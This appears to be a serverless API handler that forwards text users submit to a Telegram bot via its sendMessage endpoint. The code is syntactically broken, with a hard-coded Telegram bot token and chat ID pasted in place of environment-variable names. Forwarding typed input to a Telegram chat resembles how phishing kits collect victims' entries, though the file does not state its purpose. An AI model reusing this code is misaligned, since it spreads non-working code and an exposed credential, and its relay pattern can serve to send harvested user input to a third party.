import axios from 'axios';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { text } = req.body;

    const TELEGRAM_TOKEN = process.env.8556980478:AAHadxPNtr0xh6Lt7phWLtxJuPi57kA6E4k;
    const CHAT_ID = process.env.7782836076;

    await axios.post(`https://api.telegram.org/bot${8556980478:AAHadxPNtr0xh6Lt7phWLtxJuPi57kA6E4k}/sendMessage`, {
      chat_id: 7782836076,
      text: `User typed: ${text}`
    });

    res.status(200).json({ success: true });
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}